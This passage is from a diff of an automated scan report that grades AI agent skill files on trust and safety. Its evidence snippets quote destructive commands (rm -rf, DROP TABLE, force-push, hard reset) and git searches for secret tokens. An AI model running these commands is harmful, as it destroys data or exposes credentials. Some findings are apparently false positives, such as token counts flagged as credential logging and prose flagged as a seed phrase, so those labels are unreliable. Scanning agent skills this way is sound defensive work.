+    trust-privilege-5	PRIVILEGE	low	script	0.9	active	Requests elevated privileges	"t >/dev/null 2>&1; then echo \"Attempting apt-get install scc...\" if sudo apt-get install -y scc 2>/dev/null; then echo \"Installed via apt.\""
+  - entity_type: skill
+    entity_name: benchmark-models
+    format: claude-native
+    grade: D
+    overall_score: 0.565
+    file_path: SKILL.md
+    summary: "Needs work skill with 10 suggestions for improvement (weakest: trust)"
+    dimensions[6	]{name	score	weight	findings}:
+    completeness	0.8	0.2	0
+    clarity	0.8	0.15	0
+    actionability	0.75	0.2	0
+    safety	0.3	0.15	0
+    testability	0.6	0.1	0
+    trust	0.15	0.2	5
+    findings[5	]{id	category	severity	source	confidence	disposition	message	evidence}:
+    trust-destructive-1	DESTRUCTIVE	medium	script	0.9	active	Hard reset destroys uncommitted work	"check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file edits are within the allowed s"
+    trust-destructive-2	DESTRUCTIVE	medium	script	0.9	active	DROP TABLE/DATABASE is destructive	"string> = { Bash: 'check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file"
+    trust-exfiltration-3	EXFILTRATION	high	script	0.9	active	May leak secrets (credential in output)	"{ host: currentHost, error: new Error('Stale files detected') }); } // Print token budget summary if (!DRY_RUN && tokenBudget.length > 0) { tokenBudget."
+    trust-exfiltration-4	EXFILTRATION	high	script	0.9	active	Logging credentials to console	"= tokenBudget.reduce((s, t) => s + t.tokens, 0); console.log(''); console.log(`Token Budget (${currentHost} host)`); console.log('\u2550'.repeat(60)); for (c"
+    trust-privilege-5	PRIVILEGE	low	script	0.9	active	Requests elevated privileges	"t >/dev/null 2>&1; then echo \"Attempting apt-get install scc...\" if sudo apt-get install -y scc 2>/dev/null; then echo \"Installed via apt.\""
+  - entity_type: skill
+    entity_name: browse
+    format: claude-native
+    grade: C
+    overall_score: 0.735
+    file_path: SKILL.md
+    summary: "Acceptable skill with 5 suggestions for improvement (weakest: safety)"
+    dimensions[6	]{name	score	weight	findings}:
+    completeness	0.8	0.2	0
+    clarity	0.8	0.15	0
+    actionability	0.75	0.2	0
+    safety	0.3	0.15	0
+    testability	0.6	0.1	0
+    trust	1.0	0.2	0
+    findings: []
+  - entity_type: skill
+    entity_name: canary
+    format: claude-native
+    grade: F
+    overall_score: 0.435
+    file_path: SKILL.md
+    summary: "Poor skill with 13 suggestions for improvement (weakest: trust)"
+    dimensions[6	]{name	score	weight	findings}:
+    completeness	0.8	0.2	0
+    clarity	0.6	0.15	0
+    actionability	0.25	0.2	0
+    safety	0.3	0.15	0
+    testability	0.6	0.1	0
+    trust	0.15	0.2	5
+    findings[5	]{id	category	severity	source	confidence	disposition	message	evidence}:
+    trust-destructive-1	DESTRUCTIVE	medium	script	0.9	active	Hard reset destroys uncommitted work	"check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file edits are within the allowed s"
+    trust-destructive-2	DESTRUCTIVE	medium	script	0.9	active	DROP TABLE/DATABASE is destructive	"string> = { Bash: 'check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file"
+    trust-exfiltration-3	EXFILTRATION	high	script	0.9	active	May leak secrets (credential in output)	"{ host: currentHost, error: new Error('Stale files detected') }); } // Print token budget summary if (!DRY_RUN && tokenBudget.length > 0) { tokenBudget."
+    trust-exfiltration-4	EXFILTRATION	high	script	0.9	active	Logging credentials to console	"= tokenBudget.reduce((s, t) => s + t.tokens, 0); console.log(''); console.log(`Token Budget (${currentHost} host)`); console.log('\u2550'.repeat(60)); for (c"
+    trust-privilege-5	PRIVILEGE	low	script	0.9	active	Requests elevated privileges	"t >/dev/null 2>&1; then echo \"Attempting apt-get install scc...\" if sudo apt-get install -y scc 2>/dev/null; then echo \"Installed via apt.\""
+  - entity_type: skill
+    entity_name: careful
+    format: claude-native
+    grade: F
+    overall_score: 0.432
+    file_path: SKILL.md
+    summary: "Poor skill with 15 suggestions for improvement (weakest: trust)"
+    dimensions[6	]{name	score	weight	findings}:
+    completeness	0.8	0.2	0
+    clarity	0.7	0.15	0
+    actionability	0.5	0.2	0
+    safety	0.05	0.15	0
+    testability	0.6	0.1	0
+    trust	0.0	0.2	8
+    findings[8	]{id	category	severity	source	confidence	disposition	message	evidence}:
+    trust-destructive-1	DESTRUCTIVE	medium	inline-command	0.9	active	Destructive rm -rf on root or home directory	Risk | |---------|---------|------| | `rm -rf` / `rm -r` / `rm --recursive` | `rm -rf /var/data` | Recursive delete | | `DROP TABLE` / `DROP DATABASE` | `DROP TABLE us
+    trust-destructive-2	DESTRUCTIVE	medium	inline-command	0.9	active	Destructive rm -rf on absolute path	Risk | |---------|---------|------| | `rm -rf` / `rm -r` / `rm --recursive` | `rm -rf /var/data` | Recursive delete | | `DROP TABLE` / `DROP DATABASE` | `DROP TABLE us
+    trust-destructive-3	DESTRUCTIVE	medium	inline-command	0.9	active	Force push can destroy remote history	TABLE users;` | Data loss | | `TRUNCATE` | `TRUNCATE orders;` | Data loss | | `git push --force` / `-f` | `git push -f origin main` | History rewrite | | `git reset --hard` |
+    trust-destructive-4	DESTRUCTIVE	medium	inline-command	0.9	active	Hard reset destroys uncommitted work	| `git push --force` / `-f` | `git push -f origin main` | History rewrite | | `git reset --hard` | `git reset --hard HEAD~3` | Uncommitted work loss | | `git checkout .` / `gi
+    trust-destructive-5	DESTRUCTIVE	medium	inline-command	0.9	active	DROP TABLE/DATABASE is destructive	"-rf` / `rm -r` / `rm --recursive` | `rm -rf /var/data` | Recursive delete | | `DROP TABLE` / `DROP DATABASE` | `DROP TABLE users;` | Data loss | | `TRUNCATE` | `TRUNCATE"
+    trust-exfiltration-6	EXFILTRATION	high	script	0.9	active	May leak secrets (credential in output)	"{ host: currentHost, error: new Error('Stale files detected') }); } // Print token budget summary if (!DRY_RUN && tokenBudget.length > 0) { tokenBudget."
+    trust-exfiltration-7	EXFILTRATION	high	script	0.9	active	Logging credentials to console	"= tokenBudget.reduce((s, t) => s + t.tokens, 0); console.log(''); console.log(`Token Budget (${currentHost} host)`); console.log('\u2550'.repeat(60)); for (c"
+    trust-privilege-8	PRIVILEGE	low	script	0.9	active	Requests elevated privileges	"t >/dev/null 2>&1; then echo \"Attempting apt-get install scc...\" if sudo apt-get install -y scc 2>/dev/null; then echo \"Installed via apt.\""
+  - entity_type: skill
+    entity_name: codex
+    format: claude-native
+    grade: D
+    overall_score: 0.525
+    file_path: SKILL.md
+    summary: "Needs work skill with 12 suggestions for improvement (weakest: trust)"
+    dimensions[6	]{name	score	weight	findings}:
+    completeness	0.8	0.2	0
+    clarity	0.6	0.15	0
+    actionability	0.75	0.2	0
+    safety	0.3	0.15	0
+    testability	0.6	0.1	0
+    trust	0.1	0.2	6
+    findings[6	]{id	category	severity	source	confidence	disposition	message	evidence}:
+    trust-destructive-1	DESTRUCTIVE	medium	script	0.9	active	Hard reset destroys uncommitted work	"check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file edits are within the allowed s"
+    trust-destructive-2	DESTRUCTIVE	medium	script	0.9	active	DROP TABLE/DATABASE is destructive	"string> = { Bash: 'check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file"
+    trust-exfiltration-3	EXFILTRATION	high	script	0.9	active	May leak secrets (credential in output)	"{ host: currentHost, error: new Error('Stale files detected') }); } // Print token budget summary if (!DRY_RUN && tokenBudget.length > 0) { tokenBudget."
+    trust-exfiltration-4	EXFILTRATION	high	code	0.9	active	Printing credentials (credential logging)	"age.get('input_tokens',0) + usage.get('output_tokens',0) if tokens: print(f'\\ntokens used: {tokens}', flush=True) except: pass # Fix 2: completeness check \u2014 warn if no turn."
+    trust-exfiltration-5	EXFILTRATION	high	script	0.9	active	Logging credentials to console	"= tokenBudget.reduce((s, t) => s + t.tokens, 0); console.log(''); console.log(`Token Budget (${currentHost} host)`); console.log('\u2550'.repeat(60)); for (c"
+    trust-privilege-6	PRIVILEGE	low	script	0.9	active	Requests elevated privileges	"t >/dev/null 2>&1; then echo \"Attempting apt-get install scc...\" if sudo apt-get install -y scc 2>/dev/null; then echo \"Installed via apt.\""
+  - entity_type: skill
+    entity_name: open-gstack-browser
+    format: claude-native
+    grade: D
+    overall_score: 0.525
+    file_path: SKILL.md
+    summary: "Needs work skill with 12 suggestions for improvement (weakest: trust)"
+    dimensions[6	]{name	score	weight	findings}:
+    completeness	0.8	0.2	0
+    clarity	0.6	0.15	0
+    actionability	0.75	0.2	0
+    safety	0.3	0.15	0
+    testability	0.6	0.1	0
+    trust	0.1	0.2	6
+    findings[6	]{id	category	severity	source	confidence	disposition	message	evidence}:
+    trust-destructive-1	DESTRUCTIVE	medium	script	0.9	active	Hard reset destroys uncommitted work	"check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file edits are within the allowed s"
+    trust-destructive-2	DESTRUCTIVE	medium	script	0.9	active	DROP TABLE/DATABASE is destructive	"string> = { Bash: 'check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file"
+    trust-destructive-3	DESTRUCTIVE	medium	code	0.9	active	Force kill can corrupt state	"ID\" ] && kill \"$_OLD_PID\" 2>/dev/null || true sleep 1 [ -n \"$_OLD_PID\" ] && kill -9 \"$_OLD_PID\" 2>/dev/null || true rm -f \"$(git rev-parse --show-toplevel)/.gsta"
+    trust-exfiltration-4	EXFILTRATION	high	script	0.9	active	May leak secrets (credential in output)	"{ host: currentHost, error: new Error('Stale files detected') }); } // Print token budget summary if (!DRY_RUN && tokenBudget.length > 0) { tokenBudget."
+    trust-exfiltration-5	EXFILTRATION	high	script	0.9	active	Logging credentials to console	"= tokenBudget.reduce((s, t) => s + t.tokens, 0); console.log(''); console.log(`Token Budget (${currentHost} host)`); console.log('\u2550'.repeat(60)); for (c"
+    trust-privilege-6	PRIVILEGE	low	script	0.9	active	Requests elevated privileges	"t >/dev/null 2>&1; then echo \"Attempting apt-get install scc...\" if sudo apt-get install -y scc 2>/dev/null; then echo \"Installed via apt.\""
+  - entity_type: skill
+    entity_name: context-restore
+    format: claude-native
+    grade: D
+    overall_score: 0.565
+    file_path: SKILL.md
+    summary: "Needs work skill with 10 suggestions for improvement (weakest: trust)"
+    dimensions[6	]{name	score	weight	findings}:
+    completeness	0.8	0.2	0
+    clarity	0.8	0.15	0
+    actionability	0.75	0.2	0
+    safety	0.3	0.15	0
+    testability	0.6	0.1	0
+    trust	0.15	0.2	5
+    findings[5	]{id	category	severity	source	confidence	disposition	message	evidence}:
+    trust-destructive-1	DESTRUCTIVE	medium	script	0.9	active	Hard reset destroys uncommitted work	"check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file edits are within the allowed s"
+    trust-destructive-2	DESTRUCTIVE	medium	script	0.9	active	DROP TABLE/DATABASE is destructive	"string> = { Bash: 'check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file"
+    trust-exfiltration-3	EXFILTRATION	high	script	0.9	active	May leak secrets (credential in output)	"{ host: currentHost, error: new Error('Stale files detected') }); } // Print token budget summary if (!DRY_RUN && tokenBudget.length > 0) { tokenBudget."
+    trust-exfiltration-4	EXFILTRATION	high	script	0.9	active	Logging credentials to console	"= tokenBudget.reduce((s, t) => s + t.tokens, 0); console.log(''); console.log(`Token Budget (${currentHost} host)`); console.log('\u2550'.repeat(60)); for (c"
+    trust-privilege-5	PRIVILEGE	low	script	0.9	active	Requests elevated privileges	"t >/dev/null 2>&1; then echo \"Attempting apt-get install scc...\" if sudo apt-get install -y scc 2>/dev/null; then echo \"Installed via apt.\""
+  - entity_type: skill
+    entity_name: context-save
+    format: claude-native
+    grade: D
+    overall_score: 0.535
+    file_path: SKILL.md
+    summary: "Needs work skill with 11 suggestions for improvement (weakest: trust)"
+    dimensions[6	]{name	score	weight	findings}:
+    completeness	0.8	0.2	0
+    clarity	0.6	0.15	0
+    actionability	0.75	0.2	0
+    safety	0.3	0.15	0
+    testability	0.6	0.1	0
+    trust	0.15	0.2	5
+    findings[5	]{id	category	severity	source	confidence	disposition	message	evidence}:
+    trust-destructive-1	DESTRUCTIVE	medium	script	0.9	active	Hard reset destroys uncommitted work	"check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file edits are within the allowed s"
+    trust-destructive-2	DESTRUCTIVE	medium	script	0.9	active	DROP TABLE/DATABASE is destructive	"string> = { Bash: 'check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file"
+    trust-exfiltration-3	EXFILTRATION	high	script	0.9	active	May leak secrets (credential in output)	"{ host: currentHost, error: new Error('Stale files detected') }); } // Print token budget summary if (!DRY_RUN && tokenBudget.length > 0) { tokenBudget."
+    trust-exfiltration-4	EXFILTRATION	high	script	0.9	active	Logging credentials to console	"= tokenBudget.reduce((s, t) => s + t.tokens, 0); console.log(''); console.log(`Token Budget (${currentHost} host)`); console.log('\u2550'.repeat(60)); for (c"
+    trust-privilege-5	PRIVILEGE	low	script	0.9	active	Requests elevated privileges	"t >/dev/null 2>&1; then echo \"Attempting apt-get install scc...\" if sudo apt-get install -y scc 2>/dev/null; then echo \"Installed via apt.\""
+  - entity_type: skill
+    entity_name: cso
+    format: claude-native
+    grade: F
+    overall_score: 0.477
+    file_path: SKILL.md
+    summary: "Poor skill with 14 suggestions for improvement (weakest: trust)"
+    dimensions[6	]{name	score	weight	findings}:
+    completeness	0.8	0.2	0
+    clarity	0.6	0.15	0
+    actionability	0.61	0.2	0
+    safety	0.3	0.15	0
+    testability	0.6	0.1	0
+    trust	0.0	0.2	7
+    findings[7	]{id	category	severity	source	confidence	disposition	message	evidence}:
+    trust-destructive-1	DESTRUCTIVE	medium	script	0.9	active	Hard reset destroys uncommitted work	"check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file edits are within the allowed s"
+    trust-destructive-2	DESTRUCTIVE	medium	script	0.9	active	DROP TABLE/DATABASE is destructive	"string> = { Bash: 'check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file"
+    trust-exfiltration-3	EXFILTRATION	high	inline-command	0.9	active	May leak secrets (credential in output)	"ithub_pat_\" 2>/dev/null git log -p --all -G \"xoxb-|xoxp-|xapp-\" 2>/dev/null git log -p --all -G \"password|secret|token|api_key\" -- \"*.env\" \"*.yml\" \"*.json\" \"*.conf\" 2>/dev/null ``` **.env files tracked by"
+    trust-exfiltration-4	EXFILTRATION	high	script	0.9	active	Logging credentials to console	"= tokenBudget.reduce((s, t) => s + t.tokens, 0); console.log(''); console.log(`Token Budget (${currentHost} host)`); console.log('\u2550'.repeat(60)); for (c"
+    trust-privilege-5	PRIVILEGE	low	script	0.9	active	Requests elevated privileges	"t >/dev/null 2>&1; then echo \"Attempting apt-get install scc...\" if sudo apt-get install -y scc 2>/dev/null; then echo \"Installed via apt.\""
+    trust-injection-6	INJECTION	critical	content	0.75	active	Conditional logic based on first run (rug-pull pattern)	"kills/gstack/bin/gstack-learnings-search --limit 10 2>/dev/null || true fi ``` If `CROSS_PROJECT` is `unset` (first time): Use AskUserQuestion: > gstack can search learnings from your other projects"
+    trust-suspicious-url-7	SUSPICIOUS_URL	medium	content	0.75	active	Direct IP address (no DNS = suspicious)	"stgres://, mysql://, mongodb://, redis://) in config files, excluding localhost/127.0.0.1/example.com. Check for staging/dev configs referencing prod. **IaC security:**"
+  - entity_type: skill
+    entity_name: design-consultation
+    format: claude-native
+    grade: D
+    overall_score: 0.505
+    file_path: SKILL.md
+    summary: "Needs work skill with 14 suggestions for improvement (weakest: trust)"
+    dimensions[6	]{name	score	weight	findings}:
+    completeness	0.8	0.2	0
+    clarity	0.6	0.15	0
+    actionability	0.75	0.2	0
+    safety	0.3	0.15	0
+    testability	0.6	0.1	0
+    trust	0.0	0.2	8
+    findings[8	]{id	category	severity	source	confidence	disposition	message	evidence}:
+    trust-destructive-1	DESTRUCTIVE	medium	script	0.9	active	Hard reset destroys uncommitted work	"check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file edits are within the allowed s"
+    trust-destructive-2	DESTRUCTIVE	medium	script	0.9	active	DROP TABLE/DATABASE is destructive	"string> = { Bash: 'check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file"
+    trust-exfiltration-3	EXFILTRATION	high	inline-command	0.9	active	Posts data to external URL	"R/design-board.html\"` 5. Reload the board in the user's browser (same tab): `curl -s -X POST http://127.0.0.1:PORT/api/reload -H 'Content-Type: application/json' -d '{\"html\":\"$_DESIGN_DIR/design-board.html\"}'` 6. The board auto-refreshes. **Ask"
+    trust-exfiltration-4	EXFILTRATION	high	script	0.9	active	May leak secrets (credential in output)	"{ host: currentHost, error: new Error('Stale files detected') }); } // Print token budget summary if (!DRY_RUN && tokenBudget.length > 0) { tokenBudget."
+    trust-exfiltration-5	EXFILTRATION	high	script	0.9	active	Logging credentials to console	"= tokenBudget.reduce((s, t) => s + t.tokens, 0); console.log(''); console.log(`Token Budget (${currentHost} host)`); console.log('\u2550'.repeat(60)); for (c"
+    trust-privilege-6	PRIVILEGE	low	script	0.9	active	Requests elevated privileges	"t >/dev/null 2>&1; then echo \"Attempting apt-get install scc...\" if sudo apt-get install -y scc 2>/dev/null; then echo \"Installed via apt.\""
+    trust-injection-7	INJECTION	critical	content	0.75	active	Conditional logic based on first run (rug-pull pattern)	"kills/gstack/bin/gstack-learnings-search --limit 10 2>/dev/null || true fi ``` If `CROSS_PROJECT` is `unset` (first time): Use AskUserQuestion: > gstack can search learnings from your other projects"
+    trust-suspicious-url-8	SUSPICIOUS_URL	medium	content	0.75	active	Direct IP address (no DNS = suspicious)	"browser tab: \"I've opened a comparison board with the design variants: http://127.0.0.1:<PORT>/ \u2014 Rate them, leave comments, remix elements you like, and click Submit w"
+  - entity_type: skill
+    entity_name: design-html
+    format: claude-native
+    grade: D
+    overall_score: 0.535
+    file_path: SKILL.md
+    summary: "Needs work skill with 11 suggestions for improvement (weakest: trust)"
+    dimensions[6	]{name	score	weight	findings}:
+    completeness	0.8	0.2	0
+    clarity	0.6	0.15	0
+    actionability	0.75	0.2	0
+    safety	0.3	0.15	0
+    testability	0.6	0.1	0
+    trust	0.15	0.2	5
+    findings[5	]{id	category	severity	source	confidence	disposition	message	evidence}:
+    trust-destructive-1	DESTRUCTIVE	medium	script	0.9	active	Hard reset destroys uncommitted work	"check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file edits are within the allowed s"
+    trust-destructive-2	DESTRUCTIVE	medium	script	0.9	active	DROP TABLE/DATABASE is destructive	"string> = { Bash: 'check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file"
+    trust-exfiltration-3	EXFILTRATION	high	script	0.9	active	May leak secrets (credential in output)	"{ host: currentHost, error: new Error('Stale files detected') }); } // Print token budget summary if (!DRY_RUN && tokenBudget.length > 0) { tokenBudget."
+    trust-exfiltration-4	EXFILTRATION	high	script	0.9	active	Logging credentials to console	"= tokenBudget.reduce((s, t) => s + t.tokens, 0); console.log(''); console.log(`Token Budget (${currentHost} host)`); console.log('\u2550'.repeat(60)); for (c"
+    trust-privilege-5	PRIVILEGE	low	script	0.9	active	Requests elevated privileges	"t >/dev/null 2>&1; then echo \"Attempting apt-get install scc...\" if sudo apt-get install -y scc 2>/dev/null; then echo \"Installed via apt.\""
+  - entity_type: skill
+    entity_name: design-review
+    format: claude-native
+    grade: D
+    overall_score: 0.505
+    file_path: SKILL.md
+    summary: "Needs work skill with 13 suggestions for improvement (weakest: trust)"
+    dimensions[6	]{name	score	weight	findings}:
+    completeness	0.8	0.2	0
+    clarity	0.6	0.15	0
+    actionability	0.75	0.2	0
+    safety	0.3	0.15	0
+    testability	0.6	0.1	0
+    trust	0.0	0.2	7
+    findings[7	]{id	category	severity	source	confidence	disposition	message	evidence}:
+    trust-destructive-1	DESTRUCTIVE	medium	script	0.9	active	Hard reset destroys uncommitted work	"check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file edits are within the allowed s"
+    trust-destructive-2	DESTRUCTIVE	medium	script	0.9	active	DROP TABLE/DATABASE is destructive	"string> = { Bash: 'check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file"
+    trust-exfiltration-3	EXFILTRATION	high	script	0.9	active	May leak secrets (credential in output)	"{ host: currentHost, error: new Error('Stale files detected') }); } // Print token budget summary if (!DRY_RUN && tokenBudget.length > 0) { tokenBudget."
+    trust-exfiltration-4	EXFILTRATION	high	script	0.9	active	Logging credentials to console	"= tokenBudget.reduce((s, t) => s + t.tokens, 0); console.log(''); console.log(`Token Budget (${currentHost} host)`); console.log('\u2550'.repeat(60)); for (c"
+    trust-privilege-5	PRIVILEGE	low	script	0.9	active	Requests elevated privileges	"t >/dev/null 2>&1; then echo \"Attempting apt-get install scc...\" if sudo apt-get install -y scc 2>/dev/null; then echo \"Installed via apt.\""
+    trust-injection-6	INJECTION	critical	content	0.75	active	Conditional logic based on first run (rug-pull pattern)	"kills/gstack/bin/gstack-learnings-search --limit 10 2>/dev/null || true fi ``` If `CROSS_PROJECT` is `unset` (first time): Use AskUserQuestion: > gstack can search learnings from your other projects"
+    trust-secret-7	SECRET	high	content	0.75	active	Possible BIP39 mnemonic seed phrase	th exacting visual standards — then fix what you find. You have strong opinions about typography, spacing, and visual hierarchy, and zero tolerance for generic or AI-generated-looking interfaces. ## Setup **Parse th
+  - entity_type: skill
+    entity_name: design-shotgun
+    format: claude-native
+    grade: D
+    overall_score: 0.505
+    file_path: SKILL.md
+    summary: "Needs work skill with 13 suggestions for improvement (weakest: trust)"
+    dimensions[6	]{name	score	weight	findings}:
+    completeness	0.8	0.2	0
+    clarity	0.6	0.15	0
+    actionability	0.75	0.2	0
+    safety	0.3	0.15	0
+    testability	0.6	0.1	0
+    trust	0.0	0.2	7
+    findings[7	]{id	category	severity	source	confidence	disposition	message	evidence}:
+    trust-destructive-1	DESTRUCTIVE	medium	script	0.9	active	Hard reset destroys uncommitted work	"check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file edits are within the allowed s"
+    trust-destructive-2	DESTRUCTIVE	medium	script	0.9	active	DROP TABLE/DATABASE is destructive	"string> = { Bash: 'check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file"
+    trust-exfiltration-3	EXFILTRATION	high	inline-command	0.9	active	Posts data to external URL	"R/design-board.html\"` 5. Reload the board in the user's browser (same tab): `curl -s -X POST http://127.0.0.1:PORT/api/reload -H 'Content-Type: application/json' -d '{\"html\":\"$_DESIGN_DIR/design-board.html\"}'` 6. The board auto-refreshes. **Ask"
+    trust-exfiltration-4	EXFILTRATION	high	script	0.9	active	May leak secrets (credential in output)	"{ host: currentHost, error: new Error('Stale files detected') }); } // Print token budget summary if (!DRY_RUN && tokenBudget.length > 0) { tokenBudget."
+    trust-exfiltration-5	EXFILTRATION	high	script	0.9	active	Logging credentials to console	"= tokenBudget.reduce((s, t) => s + t.tokens, 0); console.log(''); console.log(`Token Budget (${currentHost} host)`); console.log('\u2550'.repeat(60)); for (c"
+    trust-privilege-6	PRIVILEGE	low	script	0.9	active	Requests elevated privileges	"t >/dev/null 2>&1; then echo \"Attempting apt-get install scc...\" if sudo apt-get install -y scc 2>/dev/null; then echo \"Installed via apt.\""
+    trust-suspicious-url-7	SUSPICIOUS_URL	medium	content	0.75	active	Direct IP address (no DNS = suspicious)	"browser tab: \"I've opened a comparison board with the design variants: http://127.0.0.1:<PORT>/ \u2014 Rate them, leave comments, remix elements you like, and click Submit w"
+  - entity_type: skill
+    entity_name: devex-review
+    format: claude-native
+    grade: D
+    overall_score: 0.535
+    file_path: SKILL.md
+    summary: "Needs work skill with 11 suggestions for improvement (weakest: trust)"
+    dimensions[6	]{name	score	weight	findings}:
+    completeness	0.8	0.2	0
+    clarity	0.6	0.15	0
+    actionability	0.75	0.2	0
+    safety	0.3	0.15	0
+    testability	0.6	0.1	0
+    trust	0.15	0.2	5
+    findings[5	]{id	category	severity	source	confidence	disposition	message	evidence}:
+    trust-destructive-1	DESTRUCTIVE	medium	script	0.9	active	Hard reset destroys uncommitted work	"check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file edits are within the allowed s"
+    trust-destructive-2	DESTRUCTIVE	medium	script	0.9	active	DROP TABLE/DATABASE is destructive	"string> = { Bash: 'check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file"
+    trust-exfiltration-3	EXFILTRATION	high	script	0.9	active	May leak secrets (credential in output)	"{ host: currentHost, error: new Error('Stale files detected') }); } // Print token budget summary if (!DRY_RUN && tokenBudget.length > 0) { tokenBudget."
+    trust-exfiltration-4	EXFILTRATION	high	script	0.9	active	Logging credentials to console	"= tokenBudget.reduce((s, t) => s + t.tokens, 0); console.log(''); console.log(`Token Budget (${currentHost} host)`); console.log('\u2550'.repeat(60)); for (c"
+    trust-privilege-5	PRIVILEGE	low	script	0.9	active	Requests elevated privileges	"t >/dev/null 2>&1; then echo \"Attempting apt-get install scc...\" if sudo apt-get install -y scc 2>/dev/null; then echo \"Installed via apt.\""
+  - entity_type: skill
+    entity_name: document-generate
+    format: claude-native
+    grade: F
+    overall_score: 0.405
+    file_path: SKILL.md
+    summary: "Poor skill with 14 suggestions for improvement (weakest: trust)"
+    dimensions[6	]{name	score	weight	findings}:
+    completeness	0.8	0.2	0
+    clarity	0.4	0.15	0
+    actionability	0.25	0.2	0
+    safety	0.3	0.15	0
+    testability	0.6	0.1	0
+    trust	0.15	0.2	5
+    findings[5	]{id	category	severity	source	confidence	disposition	message	evidence}:
+    trust-destructive-1	DESTRUCTIVE	medium	script	0.9	active	Hard reset destroys uncommitted work	"check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file edits are within the allowed s"
+    trust-destructive-2	DESTRUCTIVE	medium	script	0.9	active	DROP TABLE/DATABASE is destructive	"string> = { Bash: 'check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file"
+    trust-exfiltration-3	EXFILTRATION	high	script	0.9	active	May leak secrets (credential in output)	"{ host: currentHost, error: new Error('Stale files detected') }); } // Print token budget summary if (!DRY_RUN && tokenBudget.length > 0) { tokenBudget."
+    trust-exfiltration-4	EXFILTRATION	high	script	0.9	active	Logging credentials to console	"= tokenBudget.reduce((s, t) => s + t.tokens, 0); console.log(''); console.log(`Token Budget (${currentHost} host)`); console.log('\u2550'.repeat(60)); for (c"
+    trust-privilege-5	PRIVILEGE	low	script	0.9	active	Requests elevated privileges	"t >/dev/null 2>&1; then echo \"Attempting apt-get install scc...\" if sudo apt-get install -y scc 2>/dev/null; then echo \"Installed via apt.\""
+  - entity_type: skill
+    entity_name: document-release
+    format: claude-native
+    grade: D
+    overall_score: 0.535
+    file_path: SKILL.md
+    summary: "Needs work skill with 11 suggestions for improvement (weakest: trust)"
+    dimensions[6	]{name	score	weight	findings}:
+    completeness	0.8	0.2	0
+    clarity	0.6	0.15	0
+    actionability	0.75	0.2	0
+    safety	0.3	0.15	0
+    testability	0.6	0.1	0
+    trust	0.15	0.2	5
+    findings[5	]{id	category	severity	source	confidence	disposition	message	evidence}:
+    trust-destructive-1	DESTRUCTIVE	medium	script	0.9	active	Hard reset destroys uncommitted work	"check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file edits are within the allowed s"
+    trust-destructive-2	DESTRUCTIVE	medium	script	0.9	active	DROP TABLE/DATABASE is destructive	"string> = { Bash: 'check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file"
+    trust-exfiltration-3	EXFILTRATION	high	script	0.9	active	May leak secrets (credential in output)	"{ host: currentHost, error: new Error('Stale files detected') }); } // Print token budget summary if (!DRY_RUN && tokenBudget.length > 0) { tokenBudget."
+    trust-exfiltration-4	EXFILTRATION	high	script	0.9	active	Logging credentials to console	"= tokenBudget.reduce((s, t) => s + t.tokens, 0); console.log(''); console.log(`Token Budget (${currentHost} host)`); console.log('\u2550'.repeat(60)); for (c"
+    trust-privilege-5	PRIVILEGE	low	script	0.9	active	Requests elevated privileges	"t >/dev/null 2>&1; then echo \"Attempting apt-get install scc...\" if sudo apt-get install -y scc 2>/dev/null; then echo \"Installed via apt.\""
+  - entity_type: skill
+    entity_name: freeze
+    format: claude-native
+    grade: D
+    overall_score: 0.593
+    file_path: SKILL.md
+    summary: "Needs work skill with 10 suggestions for improvement (weakest: trust)"
+    dimensions[6	]{name	score	weight	findings}:
+    completeness	0.85	0.2	0
+    clarity	0.6	0.15	0
+    actionability	0.65	0.2	0
+    safety	0.75	0.15	0
+    testability	0.6	0.1	0
+    trust	0.15	0.2	5
+    findings[5	]{id	category	severity	source	confidence	disposition	message	evidence}:
